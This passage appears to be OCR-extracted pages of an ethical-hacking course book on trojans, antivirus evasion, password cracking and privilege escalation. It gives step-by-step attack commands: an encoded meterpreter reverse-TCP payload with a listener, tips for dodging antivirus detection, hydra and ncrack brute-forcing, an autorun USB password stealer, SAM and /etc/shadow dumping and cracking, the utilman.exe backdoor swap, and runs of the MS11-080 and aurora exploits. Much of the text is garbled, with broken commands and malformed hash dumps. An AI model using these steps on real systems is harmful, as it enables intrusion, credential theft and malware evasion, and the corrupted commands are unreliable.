+    You can scan verify by Free Online Engine Antivirus File and URL
+
+    http://yscan.novirthusts.org/
+
+    https://www.virustotal.com/en/
+
+
+    Windows Tools Xenocode Postbuild
+
+    Hex Workshop
+
+
+    +   - Metasploit has some encoders that we can use when we generate the payload.
+
+    - To see the encoders in metasploit, type
+
+
+    # msfconsole
+
+    Msf> use payload/windows/meterpreter/reverse_tcp
+
+    Msf> show encoders
+
+
+    The best is x86/shikata_ga_ni. Generate the payload with this encoder
+
+
+    ```
+
+    msf > payload(reverse_tcp) > generate -t exe -f mahmoud -e x86/shikata_ga_ni -
+
+    ```
+
+
+    +   - Download armitage
+
+
+    # apt-get install armitage
+
+
+    - Start the sql service
+
+    #service postgresql start
+
+
+    +   - Start armitage
+
+    - Go windows then use meterpreter then reverse_tcp We choose the encoder and LHOST
+    and LPORT and they are the IP address and port of the hacker machine listening
+    to payload. Choose the output file to be exe file.'
+  merge: -1
+  pgno: 34
+- img_proc: true
+  md: '# windows/meterpreter/reverse_tcp
+
+
+    Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+
+    Connect back to the attacker, Inject the meterpreter server DLL via the Reflective
+    DLL Injection payload (staged)
+
+
+    | Option | Value |
+
+    |---|---|
+
+    | Encoder | x86/shakata_ga_nai |
+
+    | EXIT_RUNS | process |
+
+    | Iterations | 3 |
+
+    | KeepTemplateWorking | 192.168.1.4 |
+
+    | HOSTID | 192.168.1.4 |
+
+    | Output | multi/handler |
+
+    | Show advanced options |
+
+
+    +   - Scan the file in virustotal> You will see it detected by 35 antivirus
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_35_0.png)
+
+
+    +   - We can AVOID script for encryption. We need first to install mingw32 first.
+    Run the script with necessary information, and you will get the Trojan in authorun
+    folder
+
+
+    ```
+
+    ? How stealth do you want the file? - enter 1, 2, 3, 4 or 5 and press enter
+
+
+    1. Normal - about 400K payload - fast compile - 13/46 A.V products detected as
+    malicious
+
+    2. Stealth - about 1-2 MB payload - fast compile - 12/46 A.V products detected
+    as malicious
+
+    3. Super Stealth - about 10-20MB payload - fast compile - 11/46 A.V products detected
+    as malicious
+
+    4. Insane Stealth - about 50MB payload - slower compile - 10/46 A.V products detected
+    as malicious
+
+    5. Desperate Stealth - about 100MB payload - slower compile - Not tested with
+    AV
+
+    ```'
+  merge: -1
+  pgno: 35
+- img_proc: true
+  md: '```
+
+    is analytics on host "localhost" (127.0.0.1) and active
+
+    TCP/IP connections on port 5432
+
+    ```
+
+
+    # # NEGLACION
+
+
+    Using phishing and email templates, landing pages and listeners:
+
+    - Metasploit Pro''s wizard -- type qp_pr to launch it now.
+
+
+    ```
+
+    1953 exploits, 596 auxiliary, 174 post
+
+    250 payloads, 20 encoders, 8 maps
+
+    ```
+
+
+    ```
+
+    LHOST = 192.168.1.4
+
+    LHOSTPORT = 4444
+
+    [*] Starting handler on 192.168.1.4:4444
+
+    [*] Starting payload handler..
+
+    ```
+
+
+    +   - When we scan the file, we found it was detected by 16 from 46 anti-viruses.'
+  merge: -1
+  pgno: 36
+- img_proc: true
+  md: '# Viruses and Worms
+
+
+    +   - Virus
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_37_0.png)
+
+
+    +   - Worm
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_37_1.png)
+
+
+    +   - Types of Viruses
+
+
+    # Understand the Types of Viruses
+
+
+    Viruses are classified according to two factors: what they infect and how they
+    infect A virus can infect the following components of a system:
+
+
+    +   - System sectors
+
+    - Files
+
+    - Macros (such as Microsoft Word macros)
+
+    - Companion files (supporting system files like DLL and INI files)
+
+    - Disk clusters
+
+    - Batch files (BAT files)
+
+    - Source code
+
+
+    +   - Some Tools to make worms and viruses'
+  merge: -1
+  pgno: 37
+- img_proc: true
+  md: '# Some Tools Can Make Viruses and Worms
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_38_0.png)
+
+
+    +   - JPS Virus Maker
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_38_1.png)'
+  merge: -1
+  pgno: 38
+- img_proc: true
+  md: '# 4. Part C: System Hacking
+
+
+    a) Overview in System Hacking
+
+
+    +   - Understanding Password-Cracking Techniques
+
+    - Understanding Different Types of Passwords
+
+    - Understand Escalating privileges
+
+    - Understanding Keyloggers and Other SpywareTechnologies
+
+    - Understanding Rootkits
+
+    - Understanding How to Hide Files
+
+    - Understanding Steganography Technologies
+
+    - Understanding How to Cover Your Tracks
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_39_0.png)'
+  merge: -1
+  pgno: 39
+- img_proc: true
+  md: '# Understanding Password-Cracking Techniques
+
+
+    +   - Many hacking attempts start with attempting to crack passwords. Passwords
+    are the key piece of information needed to access a system. Users, when creating
+    passwords, often select passwords that are prone to being cracked. Many reuse
+    reuse passwords or choose one that''s simple—such as a pet''s name
+
+
+    +   - Passwords are stored in the Security Accounts Manager (SAM) file on a Windows
+    system and in a password shadow file on a Linux system.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_40_0.png)'
+  merge: -1
+  pgno: 40
+- img_proc: true
+  md: '# c) Understanding Network Environment Types
+
+
+    Understanding network environment types
+
+
+    # Workgroup Domain
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_41_0.png)
+
+
+    +   - In workgroup the uses name and passwords stored in the SAM file in the same
+    machine. We can crack the passwords if we got the data on the sam file.
+
+    - In the domains, the usernames and passwords are store in the domain controller.
+    The directory service consists of four parts: domain partition, schema partition,
+    configuration partition and application partition. The domain partition contains
+    data about all objects in network. Schema partition consists of attributes or
+    class templates. The configuration partition consists of attributes.
+
+    - In active directory domains, the machine logon using Kerberos service. When
+    the client wants to access any resource, it goes to a service under Kerberos TGS
+    (ticket granting ticket). The TGS carries TGT (ticket granting ticket). In TGT
+    file contains SID for users and the security groups that the users members on
+    them. The machine requests the TGT when it wants to access a service and the active
+    directory grants it service ticket and session key the the machine gives the service
+    ticket and the authentication to the service'
+  merge: -1
+  pgno: 41
+- img_proc: true
+  md: '# Different Types of Password Cracking:
+
+
+    +   - Passive online Eavesdropping on network password exchanges. Passive online
+    attacks include sniffing, man-in-the-middle, and replay attacks.
+
+    - Active Online Guessing the Administrator password. Active online attacks include
+    automated password guessing.
+
+    - Offline: Dictionary, hybrid, and brute-force attacks.
+
+    - Non-lelectronic: Shoulder surfing, keyboard sniffing, and social engineering.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_42_0.png)'
+  merge: -1
+  pgno: 42
+- img_proc: true
+  md: '# Ethical Hacking Techniques:
+
+
+    +   - Dictionary - A file of words is run against user accounts, and if the password
+    is a simple word, it can be found pretty quickly.
+
+
+    +   - Hybrid attack - A common method utilized by users to change passwords is
+    to add a number or symbol to the end. A hybrid attack works like a dictionary
+    attack, but adds simple numbers or symbols to the password attempt.
+
+
+    +   - Brute force - The most time-consuming, but comprehensive way to crack a
+    password. Every combination of character is tried until the password is broken.
+
+
+    +   - Sybil - it is the combination of both brute force attack and the dictionary
+    attack
+
+
+    +   - Backdoor - this attack is used when the attacker gets some information about
+    the password
+
+
+    +   - Social engineering is understood to mean the art of manipulating people
+    into performing actions or divulging confidential information
+
+
+    +   - Shoulder surfing - using direct observation techniques, such as looking
+    over someone''s shoulder, to get information
+
+
+    +   - Dumpster diving is a technique used to retrieve information that could be
+    used to carry out an attack on a computer network'
+  merge: -1
+  pgno: 43
+- img_proc: true
+  md: '# f) Passive Online Attacks:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_44_0.png)
+
+
+    +   - Cain and abel Tool: Using the cain and abel tool. Tell him how you want
+    to use the cart network. Choose to make poisoning. Choose to run NTLM authentication.
+    Go to sniffers and then hosts and add. Click all hosts. Go to ARP and check the
+    gateway and the destination that we want to make ARP poisoning.
+
+    - Go and any machine in the network to see its share.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_44_1.png)
+
+
+    +   - Then go cain and abel click passwords and then click SMB and we find LM
+    hash and NTLM hash. we from this hash crack the password.
+
+
+    | Client | Username | Domain | Password | AuthType | LM Hash | NT Hash | NT Server-Chain
+    | LM Chash |
+
+    |---|---|---|---|---|---|---|---|--|
+
+    | 192.168.28.138 | lane | | | NTLM Session-S | 5497a5e6662 | D764a155d1 | 56d8c78202
+    | 00000000 |'
+  merge: -1
+  pgno: 44
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 45
+- img_proc: true
+  md: '# g) Active Online Attacks:
+
+
+    ```
+
+    Active online attacks
+
+    Password guessing
+
+    Trojan / spyware / keylogger
+
+    Tools
+
+    HYDRA: hydra -l msfadmin -P /pentest/passwords/wordlists/darkc0de.lst
+
+    192.168.28.129 ftp
+
+    crack -u msfadmin -P /pentest/passwords/wordlists/darkc0de.lst -p
+
+    5900 192.168.28.129
+
+
+    http://www.insidepro.com/dictionaries.php (password list)
+
+    ```
+
+
+    +   * You can find the password dictionary in linux in /pentest/passwords/wordlists.
+    You can find the password of ftp service using this command
+
+
+    ```
+
+    # hydra -l msfadmin -P /pentest/wordlists/darkc0de.lst 192.168.1.123 ftp
+
+    ```
+
+
+    Where msfadmin is username
+
+
+    ```
+
+    root@bt:/pentest/passwords/wordlists hydra -l msfadmin -P /pentest/passwords/wo
+
+    rdlists/darkc0de.lst 192.168.28.129 ftp
+
+    ```
+
+
+    It can find the ncrack if it is in the file list
+
+
+    +   * You can use ncrack for same purpose
+
+    * ncrack -v u msfadmin -P /pentest/wordlists/darkc0de.lst -p 21 192.168.28.291
+
+
+    ```
+
+    root@bt:/pentest/passwords/wordlists ncrack -v -u msfadmin -P /pentest/password
+
+    s/wordlists/darkc0de.lst -p 21 192.168.28.129
+
+    starting Ncrack 0.ALMIA ( http://ncrack.org ) 2013-06-06 21:33 EDT
+
+    dcovered credentials on ftp://192.168.28.129:21/ msfadmin
+
+    service: 192.168.28.129:21 ftp: msfadmin
+
+    dates: 24:30, found: 1 (1of) done
+
+    error: 0.22% done
+
+    dcovered credentials for ftp on 192.168.28.129:21/tcp:
+
+    192.168.28.129 21/tcp ftp: msfadmin
+
+    ```
+
+
+    +   * You can download password list from
+
+
+    ```
+
+    http://www.insidepro.com/dictionaries.php (password list)
+
+    ```'
+  merge: -1
+  pgno: 46
+- img_proc: true
+  md: '# h) Stealing Passwords Using USB drive:
+
+
+    new cool way to hack passwords physically, it means physical approach matters
+    a lot for this method. We will use a usb and some applications to hack stored
+    passwords in any computer. As we know now people sign up at large number of websites
+    and remember them, all they store their passwords in the computer. We will try
+    recovering them automatically with a USB drive. Yes, all we need is to plug the
+    USB in any port. This will work for Windows /
+
+
+    ```
+
+    http://www.nirssoft.net/password_recovery_tools.html
+
+    ```
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_47_0.png)
+
+
+    +   * You have flash drive and when you put inside the device, it will steal the
+    information.
+
+    * There is a tool in nirssoft.net to recover all of passwords.
+
+
+    The following table describes the most popular password recovery utilities for
+    Windows Net Web site.
+
+
+    | MessengerPass | Recovers the passwords of most popular Instant Messenger programs
+    in Windows: MSN Messenger, Windows Messenger, Windows Live Messenger, Yahoo-Messenger,
+    QQ Lite x100, AIM Messenger provided with Notepad 7 | MailPassView | Recovers
+    the passwords of the following email programs: Windows Live, Mail Web, Outlook
+    Express, Microsoft Outlook 2000 (POP, IMAP & SMTP Account), InboxMail, Eudora,
+    Net Mail, Mozilla Thunderbird | MailPassView can recover the passwords of web-based
+    email accounts (Hotmail, Yahoo!, Gmail), if you used the associated passwords
+    of these accounts. | IEPassView | IEPassView is a small utility that recovers
+    the passwords by Internet Browser. It supports the new Internet Explorer 7.0 and
+    8.0, as well as older versions of Internet Explorer, v4.0 - v6 | Protected StorageView
+    | Recovers all passwords stored in Windows Protected Storage, including the AutoComplete
+    passwords of Internet Explorer, passwords of Windows-protected sites, MSN Messenger,
+    and more. | Dialass | Password recovery tool that retrieves all passwords stored
+    in dial-up entries of Windows (Internet and VPN connections). This tool works
+    in all versions of Windows: Windows 2000, Me, Windows XP, Windows Vista, Windows
+    7, and Windows Server 2003-2008 | BulletPassView | BulletPassView is a password
+    recovery that retrieves the passwords stored behind bullets in the standard password
+    text-box of Windows operating systems and Internet Browser. After revealing the
+    passwords, you can easily copy them to the clipboard or save them into text files.
+    You can also recover the passwords of Windows applications, like CafeFTP, FileVNC,
+    and more... | Network Password Recovery | Recover network passwords stored by
+    Windows XP, Windows Vista, Windows 7, and Windows Server 2003-2008 | SniffPass
+    Password Sniffer | Windows utility which captures the passwords that pass through
+    your network adapter, and display them on the screen instantly. You can use this
+    to recover lost Web-FTP email passwords | RouterPassView | Windows utility that
+    can recover passwords from configuration file saved by a router. This only works
+    if your router saves the configuration file in that RouterPassView can detect
+    and decrypt'
+  merge: -1
+  pgno: 47
+- img_proc: true
+  md: '# Method 1 for Stealing Passwords Using USB drive
+
+
+    +   * Take the programs in the mspass, mspv, password as example. ievp_setup.exe,
+    mailpy_setup.exe. Setup the ievp and mailpy and take their programs from program
+    file.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_48_0.png)
+
+
+    +   * Make program autorun.inf in the folder
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_48_1.png)
+
+
+    +   * Make program progstart.bat
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_48_2.png)
+
+
+    +   * Save the files in the root of flash. After you the flash, the passwords
+    will be saved in the text file'
+  merge: -1
+  pgno: 48
+- img_proc: true
+  md: 'ii. Method 2 for Stealing Passwords Using USB drive: USB Utilities
+
+
+    +   - We use USB_Utilities
+
+
+    | USB TO ETHERNET CONNECTOR V2.4 |
+
+    | USB THIEF |
+
+    | USB COPYNOTIFY V1.3.5 |
+
+    | USB SAFELY REMOVE V.5.31.017 |
+
+    | PASSWORD PROTECT USB V3.0.2 |
+
+    | USB SMART SAMSUNG TOOL V1.12 |
+
+    | ID USB LOCK KEY V1.2.2 |
+
+    | USB TOOLS INFO / CONTENTS |
+
+
+    +   - Choose the USB thief. Browse. Choose the place that you extracted the USB
+    utilities. There will be two folders.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_49_0.png)
+
+
+    +   - Take the data in USBThief folder and put it in flash memory.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_49_1.png)
+
+
+    +   - When you put the flash in the machine it will dump all passwords.
+
+    - When you go home, open the dump folder.'
+  merge: -1
+  pgno: 49
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_50_0.png)'
+  merge: -1
+  pgno: 50
+- img_proc: true
+  md: '# i) The Lan Manager Hash:
+
+
+    ### What is LAN Manager Hash?
+
+    Microsoft uses NT Lan Manager (NTLM) hashing to secure passwords in transit on
+    the network. Depending on the password, NTLM hashing can be weak and easy to break
+
+
+    When this password is encrypted with LM algorithm, it is first converted to uppercase:
+    `123456QWERTY`
+
+
+    The password is padded with null (blank) characters to make it 14character length:
+    `123456QWERTY`
+
+
+    Before encrypting this password, 14 character string is split intohalf: `123456Q`
+
+
+    Each string is individually encrypted and the results concatenated.
+
+    `123456Q` = `BF11E04AFAB197F`
+
+    `WERTY` = `F1E9FFD0CC75575B15`
+
+
+    Note: The first half of the hash contains alpha-numeric characters and it will
+    take 24 hrs to crack by Lophcrack and second half only takes 60 seconds.
+
+
+    Note: ImHash has been disabled in windows vista and windows 7
+
+    The Microsoft in work group environment registers the passwords in sam files.
+    It is in system32/config folder.
+
+    We cant do anything to the SAM file while the operating system is active as it
+    is protected.
+
+    - To get the data in SAM file we have two methods. The first method to bring program
+    that can extract the data in SAM file and the second method is to boot from another
+    operating system through the live CD.
+
+
+    +   * When Microsoft saves the password, it saves them in LMHash. Now there is
+    NTLM hash.
+
+    * The Microsoft in work group environment registers the passwords in sam files.
+    It is in system32/config folder.
+
+    * We cant do anything to the SAM file while the operating system is active as
+    it is protected.
+
+    * To get the data in SAM file we have two methods. The first method to bring program
+    that can extract the data in SAM file and the second method is to boot from another
+    operating system through the live CD.'
+  merge: -1
+  pgno: 51
+- img_proc: true
+  md: '# I. Method 1 to get the data in SAM file
+
+
+    +   - If you are local in machine as normal user and you want to get the password
+    of the machine for administrator.
+
+    - Ask the administrator if you are not administrator, you can use gain program.
+    Click cracker.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_52_0.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_52_1.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_52_2.png)'
+  merge: -1
+  pgno: 52
+- img_proc: true
+  md: '# II. Method 2 to use CD to reset the password or crack the SAM hash:
+
+
+    This method used when you are not logged in the device and you don''t have an
+    account. In this method you can reset the password using PassSafe CD. The problem
+    is that the user knows the password was reset. So the other way is to try to crack
+    the password in the SAM file.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_53_0.png)
+
+
+    Choose to reset or change user account password. Put the new password for the
+    user you want to change its password.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_53_1.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_53_2.png)'
+  merge: -1
+  pgno: 53
+- img_proc: true
+  md: '+   Try to choose dump export password hashes file. Save the dumped passwords
+    in us. You must
+
+    boot from the usb drive to save the file on.
+
+
+    +   Open the saved file.
+
+
+    +   The files from username: User id: LM: NTLM hash
+
+
+    We will crack LM hash
+
+
+    ```
+
+    Administrator:500:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379:Built-in
+    account for administering the
+
+    computer/domain;
+
+    Guest:501:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::Built-in account for guest
+    access to the computer/domain;
+
+    $::501:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::3720A4E6D9F1A6E4A7E2B1D3A7:For
+    Providing Assistance;
+
+    $guest:501:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::E1C9D9E6F6B1C6E4A7E2B1A2B3D1A1A23720C0AA8B7F6A9B7C557B516:::this
+    is a vendor''s account for the help and
+
+    Support:svc;
+
+    $user:1001:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::39D1A1A2B7F6A9B9D1A1A2B39D1A1A2::
+
+    ```
+
+
+    You can use the website www.onlinehash.com in order to crack passwords
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_54_0.png)
+
+
+    ```
+
+    C:\windows\system32\config
+
+    Administrator:500:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    Guest:501:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    Default:501:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    Default:501:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    Admin:500:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    John:1000:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    John:1000:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    John:1000:PASWDLM:3116EE84E062ED24:AD33B434B5E4127F:::7390C68B379
+
+    ```
+
+
+    | User ID | LM hash | NTLM hash |
+
+    | --- | --- | --- |
+
+    | Windows 2000 users NT Lan Manager to secure passwords in transit on the network.
+    Depending on the password, NTLM hashing can be weak and easy to crack. For example,
+    let''s say the password is 123456abcdef... When this password is encrypted with
+    the NTLM algorithm, it''s converted to all uppercase: 123456ABCDEF... The password
+    is padded with null (blank) characters to make it 14 characters long: 123456ABCDEF-BCDEF=F1E9FFDCC7557B515F1E9FFDCC7557B515
+    The hash is: 56BF8E1A48AF197F (NTLM hash) |
+
+
+    +   You can crack the file using the backtracker
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_54_1.png)
+
+
+    ```
+
+    disk -l
+
+    Mount/dev/sda1 /root/
+
+    cd /root/WINDOWS/system32/config
+
+    Bkhive SYSTEM pass.txt
+
+    Samdump SAM pass.txt=Pass2.txt
+
+    cd /intent/test/password/john
+
+    /john/root/windows/system32/config/pass2.txt
+
+    ```'
+  merge: -1
+  pgno: 54
+- img_proc: true
+  md: '+   * To see the hard disk, write in backtrack
+
+
+    # fdisk -l
+
+
+    ```
+
+    root@host:~ fdisk -l
+
+    /dev/sda: 42.9 GB, 42949672960 bytes
+
+    255 heads, 63 sectors/track, 521 cylinders
+
+    Units = 10065 * 52 = 5233280 bytes
+
+    Sector size (logical/physical): 52 bytes / 52 bytes
+
+    I/O size (bytes/rnd): 52 bytes / 52 bytes
+
+    Disk identifier: 0xf3f3f1
+
+
+    Device Start End  Blocks Id System
+
+    /dev/sda      * 5220 4192618+ 7 HPFS/NTFS
+
+    root@host:~ #
+
+    ```
+
+
+    Mount the windows partition
+
+
+    # mount dev/sda1 /root
+
+
+    # cd /Windows/system32/config
+
+
+    # bkhive system password1.txt
+
+
+    +   * samdumpe2 SAM password1.txt > password2.txt
+
+
+    +   * /pentest/passwords/john
+
+
+    # /john/root/Windows/system32/ config/password2.txt
+
+
+    ```
+
+    root@host:/WINDOWS/system32/config sandump2 SAM password1.txt > password2.txt
+
+    samdump2.1.1.1 by Objectif Securite
+
+    http://www.objectif-securite.ch
+
+    original author: nunciostudent.unina.it
+
+
+    Root Key : SAM
+
+    root@host:/WINDOWS/system32/config cd /pentest/passwords/config/password2.txt
+
+    root@host:/pentest/passwords/john - /root/WINDOWS/system32/config/password2.txt
+
+    Warning: detected hash type ''le'', the string is also recognized as ''nt'' \
+
+    Use the ''format-nt'' option to force loading these as that instead \
+
+    Warning: detected hash type ''le'', the string is also recognized as ''nt2'' \
+
+    Use the ''format-nt2'' option to force loading these as that instead \
+
+    loaded 6 password hashes with no different salt (LM DES (128/120 25 5622))
+
+    (ADMIN)
+
+    (SUPPORT_388945ad0)
+
+    (Guest)
+
+    (Administrator)
+
+    ```
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_55_0.png)'
+  merge: -1
+  pgno: 55
+- img_proc: true
+  md: '# j) Offline Password Cracking:
+
+
+    We want to crack password for windows 2008 domain controller we can reset the
+    administrator password so we can login to domain controller.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_56_0.png)
+
+
+    +   * To make offline crack, put windows server 2008 in CDROM. When you login
+    point to iso image of the 2008 server
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_56_1.png)
+
+
+    +   * Restart the server. Click on esc to get the boot from menu\>Choose to boot
+    from cd
+
+    * Choose your computer
+
+
+    +   * Choose command prompt. Go c:\windows\system32'
+  merge: -1
+  pgno: 56
+- img_proc: true
+  md: "+   - Change the name of utiliman.exe to utilman.exe.bak\n- Copy cmd.exe to\
+    \ utilman.exe\n\n```\nAdministrator:C:\\Windows\\system32>\nCopyright (C) 2000-2001\
+    \ Microsoft Corporation. All rights reserved.\n\n'cmd' is not recognized as an\
+    \ internal or external command,\noperable program or batch file.\nC:\\>\nC:\\\
+    >cd system32\nC:\\Windows\\system32>\nC:\\Windows\\system32>move utiliman.exe\
+    \ utilman.exe.bak\n      file moved\nC:\\Windows\\system32>copy cmd.exe utilman.exe\n\
+    \      file copied.\nC:\\Windows\\system32_>\n```\n\n+   - Restart the machine\n\
+    - Click admin icon\n- Write the command to reset the password\n\nNet user administratorpass2005\n\
+    \n![](img/91b4da451291288ee84ff207e23ccb97_57_0.png)"
+  merge: -1
+  pgno: 57
+- img_proc: true
+  md: '# k) Offline Password Cracking in Linux:
+
+
+    +   - In the passwords registered in file /etc/shadow
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_58_0.png)
+
+
+    ```
+
+    vivek:$1$nffcc5pGteyHdicpGOffXk4ow#5:13064:0:99999:7:::
+
+    1 2 3 4 5 6
+
+    1-User name: it is your login name
+
+    2-Password: it your encrypted password. The password should be minimum 6-8 characters
+    long including special charactersdigits
+
+    3-Last password change (lastchanged) Days since Jan 1,1970 that password was last
+    changed
+
+    4-Minimum: The minimum number of days required between password changes i.e. the
+    number of days
+
+    left before the user is allowed to change his password
+
+    5-Maximum: The maximum number of days the password is valid (after that user is
+    forced to change
+
+    his/her password)
+
+    6-Warn: The number of days before password is to expire that user is warned that
+    his password mustust be changed
+
+    7-Inactive: The number of days after password expires that account is disabled
+
+    8-Expire: days since Jan 1, 1970 that account is disabled i.e. an absolute date
+    specifying when the login
+
+    may no longer be used
+
+    ```
+
+
+    +   - Offline Password Cracking:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_58_1.png)
+
+
+    ```
+
+    Offline Password Cracking
+
+    Crack Root Password In Unix
+
+    Cat /etc/passwd
+
+    Save pass.txt
+
+    Cat /etc/shadow
+
+    Save shadow.txt
+
+    Cd /pentest/password/jhon
+
+    /unshadow/root/Desktop/pass.txt
+
+    /root/Desktop/shadow.txt > /root/Desktop/crack.txt
+
+    /jhon/root/Desktop/crack.txt
+
+    ```
+
+
+    +   - Save the password files passwd and shadow to password.txt.
+
+
+    #Kate/etc/passwd and save it to password.txt
+
+
+    #Kate/etc/shadow and save it to shadow.txt
+
+
+    +   - Use the join tools
+
+
+    ```
+
+    #cd/pentest/passwords/jhon
+
+    #/unshadow password.txt shadow.txt > crack.txt
+
+    #/jhon crack.txt
+
+    ```'
+  merge: -1
+  pgno: 58
+- img_proc: true
+  md: '```
+
+    root@bt:~/pentest/passwords/john
+
+    kate(2328)@kdecore (services) KMimeTypeFactory::parseMagic: Now parsing "/usr/share/mimeinfo/magic"
+
+    root@bt:~ #kate /etc/shadow
+
+    kate(2339)@kdecore (services) KMimeTypeFactory::parseMagic: Now parsing "/usr/share/mimeinfo/magic"
+
+    root@bt:~ #kate /etc/shadow
+
+    kate(2351)@kdecore (services) KMimeTypeFactory::parseMagic: Now parsing "/usr/share/mimeinfo/magic"
+
+    root@bt:~ cd ~/pentest/passwords/john
+
+    john /root/passwd.txt /root/Desktop/passwd.txt
+
+    top/shadow.txt
+
+    john ~/pentest/passwords/john > /root/Desktop/crack.txt
+
+    Warning detected hash type "sha512crypt", but the string is also recognized as
+    "md5"
+
+    Use the "--format=crypt" option to force loading these as that type instead
+
+    Loaded 1 password hash (sha512crypt 32/32)
+
+    (root)
+
+    guesses: 1 time: 0:00:00 DONE (Fri Jun 7 15:23:59 2013) c/s: 53.84 trying
+
+    (root)
+
+    Use the "--show" option to display all of the cracked passwords reliably
+
+    root@bt:~/pentest/passwords/john#
+
+    ```'
+  merge: -1
+  pgno: 59
+- img_proc: true
+  md: '# 1) Understanding hashcat tools and gpu techniques
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_60_0.png)
+
+
+    The hashcat tool is used to decrypt the hash passwords. It can crack md5. The
+    md5 is one way encryption, which means the password can be encrypted but be decrypted
+    again.
+
+
+    Download hashcat to crack the md5 hash. Hashcat will compare two hashes together.
+    It will bring a word and encrypt it and compare it with the hash of the password
+    and if they are equal, the two words are same. We have three vesion: hashcat,
+    hashcat-gui, ochash-plus.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_60_1.png)'
+  merge: -1
+  pgno: 60
+- img_proc: true
+  md: "# m) Privilege Escalation\n\nPrivilege Escalation is to use the higher privileges.\
+    \ Some backdoors can take administrator privileges\n\n![Privilege Escalation](https://example.com/privilege_escalation.png)\n\
+    If an attacker gainsaccess to the network\nusing a non-admin useraccount, the\
+    \ next\nsteps to gain higherprivilege to that of\\administrator\nExample\nMS11-080\
+    \ - CVE-2011-2005 Afd.sys\nPrivilege Escalation Exploit\n\n+   - To know the users,\
+    \ g:\\documents and settings you will find the users profiles for all users in\
+    \ the machine\n- To get the information for the user, write\n\n>Net user user\n\
+    - Use the MS11-080 to change the privilege\n>MS11-080.py - 0 xp\n\n```\nC:\\Documents\
+    \ and Settings\\mahmoud>cd desktop\nC:\\Documents and Settings\\mahmoud\\Desktop>dir\n\
+    Volume in drive C has no label.\nVolume Serial Number is 08AP-C085\n\nDirectory\
+    \ of C:\\Documents and Settings\\mahmoud\\Desktop\n06/09/2013  12:32 PM    <DIR>\
+    \                 .\n06/09/2013  12:32 PM    <DIR>                 ..\n06/09/2013\
+    \  12:22 PM            12,217 MS11-080.py\n                               1 File(s)\
+    \              12,217 bytes\n                               2 Dir(s)         \
+    \    38,369,394 bytes free\n\nC:\\Documents and Settings\\mahmoud\\Desktop>MS11-080.py\
+    \ -O xp\n```"
+  merge: -1
+  pgno: 61
+- img_proc: true
+  md: '# Understanding Keyloggers and Spyware Techniques
+
+
+    If all attempts to gather passwords fail, then a keystroke logger is the tool
+    of choice for hackers. Keystroke loggers (keyloggers) can be implemented either
+    using hardware or software. Hardware keyloggers are small hardware devices that
+    connect the keyboard to the PC and save every keystroke into a file or in the
+    memory of the hardware device. In order to install a hardware keylogger, a hacker
+    must have physical access to the system. Software keyloggers are pieces of stealth
+    software that sit between the keyboard and the operating system, so that they
+    can record every keystroke. Software keyloggers can be deployed on a system by
+    Trojans or viruses.
+
+
+    +   - There are hardware keyloggers and software keyloggers
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_62_0.png)
+
+
+    +   - The hardware keylogger is hardware to connect the PC and keyboard to register
+    every keyed letter. It is not detected by spyware
+
+    - There are programs to detect the keyboard actions
+
+    - PCSpy spykeylogger can do the task
+
+    - Actualspy can do the task'
+  merge: -1
+  pgno: 62
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_63_0.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_63_1.png)
+
+
+    You can use metasploit keylogger'
+  merge: -1
+  pgno: 63
+- img_proc: true
+  md: '# o) Metasploit Keylogger and Privileges Escalation
+
+
+    ```
+
+    msfconsole
+
+    use exploit/windows/browser/ms10_002_aurora
+
+    > exploit(ms10_002_aurora) > set SRVHOST 192.168.28.133
+
+    > exploit(ms10_002_aurora) > set SRVPORT 80
+
